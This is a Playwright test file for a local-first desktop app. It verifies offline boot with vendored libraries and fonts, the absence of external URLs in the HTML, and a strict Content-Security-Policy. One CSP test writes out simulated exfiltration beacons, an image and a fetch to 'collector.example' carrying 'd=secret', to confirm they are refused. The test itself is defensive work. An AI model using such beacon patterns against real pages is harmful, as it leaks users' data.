// Offline-boot regression test (Phase P0-1: vendored assets).
//
// Every third-party asset — React, ReactDOM, Babel-standalone, marked,
// highlight.js, DOMPurify, and the three font families — is vendored under
// ui/vendor/ so the app boots with ZERO network access beyond local Ollama.
// This spec enforces that two ways:
//
//   1. Dynamically: load the fixture with every non-localhost request
//      aborted (and recorded), then assert the page still boots fully and
//      that no external request was even ATTEMPTED.
//   2. Statically: scan ui/index.html and the fixture for http(s) URLs in
//      src/href attributes — the cheapest possible "someone reintroduced a
//      CDN tag" tripwire.
//
// If this file is red, the "runs fully offline" claim on the website is
// false. Fix the regression, don't loosen the test.

const { test, expect } = require("@playwright/test");

test.describe("offline boot (vendored assets)", () => {
  test("fixture boots fully with all external requests blocked", async ({ page }) => {
    const externalAttempts = [];
    await page.route("**/*", (route) => {
      const url = new URL(route.request().url());
      if (url.hostname === "localhost" || url.hostname === "127.0.0.1") {
        return route.continue();
      }
      externalAttempts.push(url.href);
      return route.abort();
    });

    await page.goto("/tests/e2e/fixtures/playwright.html");
    await page.waitForFunction(() => window.__JSX_READY === true, null, {
      timeout: 10_000,
    });

    // Full boot: vendored production React + every library global present.
    const boot = await page.evaluate(() => ({
      reactVersion: window.React?.version,
      hasReactDOM: !!window.ReactDOM,
      hasMarked: !!window.marked,
      hasHljs: !!window.hljs,
      hasDOMPurify: !!window.DOMPurify,
      OnboardingTour: typeof window.OnboardingTour,
    }));
    expect(boot.reactVersion).toBe("18.3.1");
    expect(boot.hasReactDOM).toBe(true);
    expect(boot.hasMarked).toBe(true);
    expect(boot.hasHljs).toBe(true);
    expect(boot.hasDOMPurify).toBe(true);
    expect(boot.OnboardingTour).toBe("function");

    // A real component renders real text — not just "no exception thrown".
    await page.evaluate(() => window.__TEST_MOUNT("OnboardingTour", { open: true }));
    await expect(page.locator("#test-root")).toContainText("Welcome to Ekorbia");

    // Vendored fonts actually load (they're lazy — only fetched once
    // rendered text uses them, which the mount above guarantees).
    await page.evaluate(() => document.fonts.ready);
    const interLoaded = await page.evaluate(() =>
      Array.from(document.fonts).some(
        (f) => f.family.replace(/['"]/g, "") === "Inter" && f.status === "loaded"
      )
    );
    expect(interLoaded).toBe(true);

    // The headline assertion: nothing even tried to leave the machine.
    expect(externalAttempts).toEqual([]);
  });

  test("ui/index.html and the fixture reference no external URLs", async ({ page }) => {
    for (const path of ["/ui/index.html", "/tests/e2e/fixtures/playwright.html"]) {
      const resp = await page.request.get(path);
      const html = await resp.text();
      // src/href attributes pointing at http(s) — comments and prose may
      // mention URLs (e.g. vendor provenance notes); only attributes load.
      const externals = [...html.matchAll(/(?:src|href)="(https?:\/\/[^"]+)"/g)].map(
        (m) => m[1]
      );
      expect(externals, `${path} must not load external resources`).toEqual([]);
    }
  });
});

// The content-security policy (the <meta> at the top of ui/index.html, with
// an identical tag in the fixture). It is the second lock behind the reply
// cleaner in markdown.jsx: whatever ends up in the page, the interface can
// load only its own files. If this block is red, a reply, a pasted document
// or a future bug can make the app call out. Fix it, don't loosen it.
test.describe("content-security policy", () => {
  const POLICY = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/;

  test("ui/index.html and the fixture carry the same policy", async ({ page }) => {
    const read = async (path) => {
      const html = await (await page.request.get(path)).text();
      const m = html.match(POLICY);
      expect(m, `${path} must carry a Content-Security-Policy meta tag`).not.toBeNull();
      return m[1];
    };
    const app = await read("/ui/index.html");
    const fixture = await read("/tests/e2e/fixtures/playwright.html");
    expect(fixture).toBe(app);
    // The directives the privacy claim rests on.
    expect(app).toContain("default-src 'self'");
    expect(app).toContain("img-src 'self' data: blob:");
    expect(app).toContain("connect-src 'self' ipc: http://ipc.localhost");
    expect(app).toContain("form-action 'none'");
    expect(app).not.toMatch(/https:|\*/);
  });

  test("a remote image and a remote request are refused before they leave", async ({ page }) => {
    const externalAttempts = [];
    await page.route("**/*", (route) => {
      const url = new URL(route.request().url());
      if (url.hostname === "localhost" || url.hostname === "127.0.0.1") {
        return route.continue();
      }
      externalAttempts.push(url.href);
      return route.abort();
    });
    await page.goto("/tests/e2e/fixtures/playwright.html");
    await page.waitForFunction(() => window.__JSX_READY === true);

    const result = await page.evaluate(async () => {
      const refused = [];
      document.addEventListener("securitypolicyviolation", (e) =>
        refused.push(e.effectiveDirective || e.violatedDirective),
      );
      const img = new Image();
      const imgDone = new Promise((resolve) => {
        img.onload = () => resolve("loaded");
        img.onerror = () => resolve("refused");
      });
      img.src = "https://collector.example/pixel.png?d=secret";
      document.body.appendChild(img);
      let request = "sent";
      try {
        await fetch("https://collector.example/beacon?d=secret");
      } catch (_) {
        request = "refused";
      }
      const image = await Promise.race([
        imgDone,
        new Promise((resolve) => setTimeout(() => resolve("timed out"), 3000)),
      ]);
      return { refused, image, request };
    });

    expect(result.image).toBe("refused");
    expect(result.request).toBe("refused");
    expect(result.refused).toEqual(expect.arrayContaining(["img-src", "connect-src"]));
    // Refused by the policy, so the network layer never saw either one.
    expect(externalAttempts).toEqual([]);
  });

  test("the app as shipped boots under its policy without a single violation", async ({ page }) => {
    await page.addInitScript(() => {
      window.__CSP_VIOLATIONS = [];
      document.addEventListener("securitypolicyviolation", (e) =>
        window.__CSP_VIOLATIONS.push(`${e.effectiveDirective || e.violatedDirective} ${e.blockedURI}`),
      );
    });
    // ui/index.html exactly as shipped, with only the Tauri mock added.
    await page.route("**/ui/index.html", async (route) => {
      const res = await route.fetch();
      const html = (await res.text()).replace(
        "<head>",
        '<head>\n<script src="/tests/e2e/fixtures/mock-tauri.js"></script>',
      );
      await route.fulfill({ status: 200, contentType: "text/html; charset=utf-8", body: html });
    });
    await page.goto("/ui/index.html");
    // Babel compiled every .jsx file and React mounted the app.
    await page.waitForFunction(
      () => (document.getElementById("root")?.childElementCount || 0) > 0,
      null,
      { timeout: 20_000 },
    );
    await page.evaluate(() => document.fonts.ready);
    await page.waitForTimeout(500);
    expect(await page.evaluate(() => window.__CSP_VIOLATIONS)).toEqual([]);
  });
});

